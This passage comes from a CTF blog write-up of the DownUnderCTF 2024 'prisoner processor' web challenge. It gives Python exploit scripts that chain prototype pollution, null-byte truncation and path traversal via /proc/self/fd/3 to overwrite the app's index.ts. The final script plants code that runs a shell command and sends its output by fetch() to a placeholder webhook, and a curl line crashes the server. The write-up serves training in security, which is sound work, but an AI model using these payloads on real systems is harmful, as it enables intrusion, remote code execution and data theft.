<span class="k">if</span> <span class="p">(</span><span class="nx">convertJsonToYaml</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">outputFile</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="na">msg</span><span class="p">:</span> <span class="nx">outputFile</span> <span class="p">});</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="na">msg</span><span class="p">:</span> <span class="dl">"</span><span class="s2">failed to convert JSON</span><span class="dl">"</span> <span class="p">},</span> <span class="mi">500</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Is it possible to end with a different extension instead of <code class="language-plaintext highlighter-rouge">.yaml</code>? If yes, where should we upload it? Let’s start by fuzzing different characters that could possibly <strong>truncate</strong> the extension at the end.</p><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">list_chars</span> <span class="o">=</span> <span class="p">[</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="s">"2</span><span class="se">\00</span><span class="s">"</span><span class="p">,</span><span class="s">"3%00"</span><span class="p">,</span><span class="s">"4%0a"</span><span class="p">,</span><span class="s">"5</span><span class="se">\u0000</span><span class="s">"</span><span class="p">,</span><span class="s">"6</span><span class="se">\t</span><span class="s">"</span><span class="p">,</span><span class="s">"7</span><span class="se">\r\n</span><span class="s">"</span><span class="p">]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">list_chars</span><span class="p">:</span>
    <span class="n">body</span> <span class="o">=</span> <span class="p">{</span><span class="s">"data"</span><span class="p">:{</span><span class="s">"signed.name"</span><span class="p">:</span><span class="s">"jeff"</span><span class="p">,</span><span class="s">"signed.animalType"</span><span class="p">:</span><span class="s">"emu"</span><span class="p">,</span><span class="s">"signed.age"</span><span class="p">:</span><span class="mi">12</span><span class="p">,</span><span class="s">"signed.crime"</span><span class="p">:</span><span class="s">"assault"</span><span class="p">,</span><span class="s">"signed.description"</span><span class="p">:</span><span class="s">"clotheslined someone with their neck"</span><span class="p">,</span><span class="s">"signed.start"</span><span class="p">:</span><span class="s">"2024-03-02T10:45:01Z"</span><span class="p">,</span><span class="s">"signed.release"</span><span class="p">:</span><span class="s">"2054-03-02T10:45:01Z"</span><span class="p">,</span>
<span class="s">"signed.__proto__"</span><span class="p">:{</span><span class="s">"outputPrefix"</span><span class="p">:</span><span class="s">"hijack"</span><span class="p">}</span>
<span class="p">},</span><span class="s">"signature"</span><span class="p">:</span><span class="s">"718494ab34fb37e1adeea4b4c87de8feb9aa504310d8c67af693928d6377af13"</span><span class="p">}</span>
    <span class="n">body</span><span class="p">[</span><span class="s">"data"</span><span class="p">][</span><span class="s">"signed.__proto__"</span><span class="p">][</span><span class="s">"outputPrefix"</span><span class="p">]</span><span class="o">+=</span><span class="n">i</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://localhost:1337/convert-to-yaml"</span><span class="p">,</span><span class="n">json</span><span class="o">=</span><span class="n">body</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>

<span class="c1"># └─$ python3 fuzzing_chars.py
# {"msg":"hijack1\n-ffa0e9bd0fcef840.yaml"}
# {"msg":"hijack2\u0000-1ced8e4a1dce4bb4.yaml"}
# {"msg":"hijack3%00-0472e6d1353275ac.yaml"}
# {"msg":"hijack4%0a-ba07b231030f1baf.yaml"}
# {"msg":"hijack5\u0000-38aabe96b54279ac.yaml"}
# {"msg":"hijack6\t-b6d177d4927dbbee.yaml"}
# {"msg":"hijack7\r\n-b86dd8d1d1091398.yaml"}
</span></pre></table></code></div></div><p>The result show that <code class="language-plaintext highlighter-rouge">Bun</code> will truncate everything after the <strong>null byte</strong>.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-36.png" alt="alt text" data-proofer-ignore></p><p><strong>C. Bypass BANNED_STRINGS with Symlink /proc/self/fd/3</strong></p><p>In <code class="language-plaintext highlighter-rouge">/app</code>, we can see few files that might be interesting to overwrite. But how to access <code class="language-plaintext highlighter-rouge">/app</code> without having <code class="language-plaintext highlighter-rouge">app</code> keyword in <code class="language-plaintext highlighter-rouge">outputPrefix</code>?</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-37.png" alt="alt text" data-proofer-ignore></p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-38.png" alt="alt text" data-proofer-ignore></p><p>Looking into each one of the <code class="language-plaintext highlighter-rouge">fd</code> folder, there is one symlink to <code class="language-plaintext highlighter-rouge">/app/src/index.ts</code>.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-39.png" alt="alt text" data-proofer-ignore></p><p>With this, we can actually use <code class="language-plaintext highlighter-rouge">/proc/self/fd/3</code> instead of using any of the <strong>BANNED_STRINGS</strong> such as <code class="language-plaintext highlighter-rouge">.ts</code> or <code class="language-plaintext highlighter-rouge">app</code>.</p><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">body</span> <span class="o">=</span> <span class="p">{</span><span class="s">"data"</span><span class="p">:{</span><span class="s">"signed.name"</span><span class="p">:</span><span class="s">"jeff"</span><span class="p">,</span><span class="s">"signed.animalType"</span><span class="p">:</span><span class="s">"emu"</span><span class="p">,</span><span class="s">"signed.age"</span><span class="p">:</span><span class="mi">12</span><span class="p">,</span><span class="s">"signed.crime"</span><span class="p">:</span><span class="s">"assault"</span><span class="p">,</span><span class="s">"signed.description"</span><span class="p">:</span><span class="s">"clotheslined someone with their neck"</span><span class="p">,</span><span class="s">"signed.start"</span><span class="p">:</span><span class="s">"2024-03-02T10:45:01Z"</span><span class="p">,</span><span class="s">"signed.release"</span><span class="p">:</span><span class="s">"2054-03-02T10:45:01Z"</span><span class="p">,</span>
<span class="s">"signed.__proto__"</span><span class="p">:{</span><span class="s">"outputPrefix"</span><span class="p">:</span><span class="s">"../../proc/self/fd/3</span><span class="se">\00</span><span class="s">"</span><span class="p">}</span>
<span class="p">},</span><span class="s">"signature"</span><span class="p">:</span><span class="s">"718494ab34fb37e1adeea4b4c87de8feb9aa504310d8c67af693928d6377af13"</span><span class="p">}</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://localhost:1337/convert-to-yaml"</span><span class="p">,</span><span class="n">json</span><span class="o">=</span><span class="n">body</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-40.png" alt="alt text" data-proofer-ignore></p><p><strong>D. Crash and RCE</strong></p><p>Before we start thinking what to write in <code class="language-plaintext highlighter-rouge">index.ts</code>, let’s look for a way to restart the server. Using simple google search, I found the <a href="https://github.com/oven-sh/bun/issues/5479">following</a> article.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-41.png" alt="alt text" data-proofer-ignore></p><p>Let’s try upload with the following payload. It’s not working..</p><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">crash_payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">100000</span>
<span class="n">body</span> <span class="o">=</span> <span class="p">{</span><span class="s">"data"</span><span class="p">:{</span>
<span class="s">"random"</span><span class="p">:</span><span class="n">crash_payload</span><span class="p">,</span><span class="s">"signed.name"</span><span class="p">:</span><span class="s">"jeff"</span><span class="p">,</span><span class="s">"signed.animalType"</span><span class="p">:</span><span class="s">"emu"</span><span class="p">,</span><span class="s">"signed.age"</span><span class="p">:</span><span class="mi">12</span><span class="p">,</span><span class="s">"signed.crime"</span><span class="p">:</span><span class="s">"assault"</span><span class="p">,</span><span class="s">"signed.description"</span><span class="p">:</span><span class="s">"clotheslined someone with their neck"</span><span class="p">,</span><span class="s">"signed.start"</span><span class="p">:</span><span class="s">"2024-03-02T10:45:01Z"</span><span class="p">,</span><span class="s">"signed.release"</span><span class="p">:</span><span class="s">"2054-03-02T10:45:01Z"</span><span class="p">,</span>
<span class="s">"signed.__proto__"</span><span class="p">:{</span><span class="s">"outputPrefix"</span><span class="p">:</span><span class="s">"hijack</span><span class="se">\u0000</span><span class="s">"</span><span class="p">}</span>
<span class="p">},</span><span class="s">"signature"</span><span class="p">:</span><span class="s">"718494ab34fb37e1adeea4b4c87de8feb9aa504310d8c67af693928d6377af13"</span><span class="p">}</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://localhost:1337/convert-to-yaml"</span><span class="p">,</span><span class="n">json</span><span class="o">=</span><span class="n">body</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
<span class="c1"># └─$ python3 crash.py
# Payload Too Large
</span></pre></table></code></div></div><p>Looking into the offical writeup, by sending <code class="language-plaintext highlighter-rouge">/dev/urandom</code> will crash the apps with the following error.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl -F 'file=@/dev/urandom' -H 'Content-Type: application/json' -X POST http://localhost:1337/convert-to-yaml
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-42.png" alt="alt text" data-proofer-ignore></p><p>Also, it’s possible to crash it by writing over <code class="language-plaintext highlighter-rouge">non-existed</code> files in <code class="language-plaintext highlighter-rouge">/proc</code></p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="dl">"</span><span class="s2">outputPrefix</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">../../../../proc/notexist</span><span class="dl">"</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-43.png" alt="alt text" data-proofer-ignore></p><p>Below is the full code to get the flag</p><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>

<span class="c1"># Get Signature + examples
</span><span class="n">body</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://&lt;TARGET_SERVER&gt;/examples"</span><span class="p">).</span><span class="n">json</span><span class="p">()[</span><span class="s">"examples"</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
<span class="n">signature</span> <span class="o">=</span> <span class="n">body</span><span class="p">[</span><span class="s">"signature"</span><span class="p">]</span>

<span class="c1"># Write RCE payload to index.t
</span><span class="n">body</span><span class="p">[</span><span class="s">"data"</span><span class="p">][</span><span class="s">"signed.__proto__"</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"outputPrefix"</span><span class="p">:</span><span class="s">"../../proc/self/fd/3</span><span class="se">\00</span><span class="s">"</span><span class="p">}</span>
<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"data"</span><span class="p">:</span> <span class="p">{</span>
        <span class="c1"># Put this line first as it will be at the top line
</span>        <span class="s">"const a"</span><span class="p">:</span> <span class="s">"string = new TextDecoder().decode(Bun.spawnSync([</span><span class="se">\"</span><span class="s">/bin/bash</span><span class="se">\"</span><span class="s">, </span><span class="se">\"</span><span class="s">-c</span><span class="se">\"</span><span class="s">, </span><span class="se">\"</span><span class="s">/bin/getflag</span><span class="se">\"</span><span class="s">]).stdout);fetch(</span><span class="se">\"</span><span class="s">https://&lt;WEBHOOK&gt;&gt;?=</span><span class="se">\"</span><span class="s">+a)/*"</span><span class="p">,</span>
        <span class="o">**</span><span class="n">body</span><span class="p">[</span><span class="s">"data"</span><span class="p">],</span>
        <span class="s">"nothing"</span><span class="p">:</span> <span class="s">"nothing */"</span>
    <span class="p">},</span>
    <span class="s">"signature"</span><span class="p">:</span> <span class="n">signature</span>
<span class="p">}</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"https://&lt;TARGET_SERVER&gt;/convert-to-yaml"</span><span class="p">,</span><span class="n">json</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>

<span class="c1"># Crash + Restart
</span><span class="n">body</span><span class="p">[</span><span class="s">"data"</span><span class="p">][</span><span class="s">"signed.__proto__"</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"outputPrefix"</span><span class="p">:</span><span class="s">"../../proc/notexist"</span><span class="p">}</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"https://&lt;TARGET_SERVER&gt;/convert-to-yaml"</span><span class="p">,</span><span class="n">json</span><span class="o">=</span><span class="n">body</span><span class="p">)</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-44.png" alt="alt text" data-proofer-ignore></p><p>Flag: <code class="language-plaintext highlighter-rouge">DUCTF{bUnBuNbUNbVN_hOn0_tH15_aPp_i5_d0n3!!!one1!!!!}</code></p><h2 id="references"><span class="mr-2">References</span><a href="#references" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>https://github.com/DownUnderCTF/Challenges_2024_Public/tree/main/web<li>https://jamvie.net/posts/2024/07/ductf-2024-prisoner-processor/</ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>ctf</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=DownUnderctf+2024+%5BWEB%5D+-+%24%28H0j3n%29&url=https%3A%2F%2Fh0j3n.github.io%2Fposts%2FDownUnderCTF-2024%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=DownUnderctf+2024+%5BWEB%5D+-+%24%28H0j3n%29&u=https%3A%2F%2Fh0j3n.github.io%2Fposts%2FDownUnderCTF-2024%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fh0j3n.github.io%2Fposts%2FDownUnderCTF-2024%2F&text=DownUnderctf+2024+%5BWEB%5D+-+%24%28H0j3n%29" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/ImaginaryCTF-2024/">ImaginaryCTF 2024 [WEB]</a><li><a href="/posts/DownUnderCTF-2024/">DownUnderctf 2024 [WEB]</a><li><a href="/posts/IntigritiCTF-2023-Writeup/">Intigriti CTF 2023 Writeup [WEB]</a><li><a href="/posts/TCP1PCTF-2023-Web-Unsecure/">TCP1PCTF 2023 - Un Secure [WEB]</a><li><a href="/posts/Offensive-Security-Experienced-Pentester-OSEP-Review/">Offensive Security Experienced Pentester OSEP Review</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/certification/">certification</a> <a class="post-tag" href="/tags/flareon/">flareon</a> <a class="post-tag" href="/tags/pwn/">Pwn</a> <a class="post-tag" href="/tags/pwnable-kr/">pwnable.kr</a> <a class="post-tag" href="/tags/intigriti/">intigriti</a> <a class="post-tag" href="/tags/osep/">osep</a> <a class="post-tag" href="/tags/oswe/">oswe</a> <a class="post-tag" href="/tags/webs/">Webs</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HackTM-CTF-2023-Writeup/"><div class="card-body"> <em class="small" data-ts="1676764800" data-df="ll" > Feb 19, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTM CTF 2023 - Writeup</h3><div class="text-muted small"><p> This write-up serves as a personal reference and a tool for me to practice CTF. It includes information and solutions collected from various sources, including challenges that were not solved durin...</p></div></div></a></div><div class="card"> <a href="/posts/TJCTF-2023-Writeup/"><div class="card-body"> <em class="small" data-ts="1685145600" data-df="ll" > May 27, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TJCTF 2023 - Writeup</h3><div class="text-muted small"><p> Welcome to my blog, where I will share a write-up on the web challenges. I am a member of Team M53 from Malaysia, and we participated in the TJCTF 2023 competition this year. Link to archive cha...</p></div></div></a></div><div class="card"> <a href="/posts/Intigriti-Challenge-1021-Writeup/"><div class="card-body"> <em class="small" data-ts="1685664000" data-df="ll" > Jun 2, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Intigriti - Challenge 1021 Writeup</h3><div class="text-muted small"><p> This is my first attempt at the intigriti challenge. I’m writing this to learn and share my experience with others. I’ve included information from various sources to provide a comprehensive overvie...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/IntigritiCTF-2023-Writeup/" class="btn btn-outline-primary" prompt="Older"><p>Intigriti CTF 2023 Writeup [WEB]</p></a> <a href="/posts/ImaginaryCTF-2024/" class="btn btn-outline-primary" prompt="Newer"><p>ImaginaryCTF 2024 [WEB]</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/h0j3n">H0j3n</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/certification/">certification</a> <a class="post-tag" href="/tags/flareon/">flareon</a> <a class="post-tag" href="/tags/pwn/">Pwn</a> <a class="post-tag" href="/tags/pwnable-kr/">pwnable.kr</a> <a class="post-tag" href="/tags/intigriti/">intigriti</a> <a class="post-tag" href="/tags/osep/">osep</a> <a class="post-tag" href="/tags/oswe/">oswe</a> <a class="post-tag" href="/tags/webs/">Webs</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
